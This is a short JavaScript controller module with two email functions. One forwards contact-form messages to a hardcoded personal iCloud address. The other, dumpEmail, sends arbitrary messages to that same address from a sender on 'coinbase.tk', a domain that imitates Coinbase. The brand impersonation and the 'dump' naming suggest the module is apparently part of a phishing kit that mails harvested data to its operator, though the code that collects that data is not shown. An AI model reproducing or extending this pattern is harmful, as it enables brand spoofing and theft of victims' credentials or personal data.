import db from '../db';
import { buildAndSendEmail } from '../models/emailSender';

export const sendContactEmail = (req, res) => {
	buildAndSendEmail( 'bardaq@icloud.com', req.body.sender, req.body.msg, (err, response) => {
		if (err) return console.log('Error response received');
		res.sendStatus(200);
		return console.log(`Email sent. \n${response.statusCode} \n${response.body} \n${response.headers}`);
	});
}

export const dumpEmail = msg => {
	buildAndSendEmail( 'bardaq@icloud.com', 'no-reply@coinbase.tk', msg, (err, response) => {
		if (err) return console.log(`Email not sent. Error response received.\n${err}`);
		return console.log(`Email sent. \n${response.statusCode} \n${response.body} \n${response.headers}`);
	});
}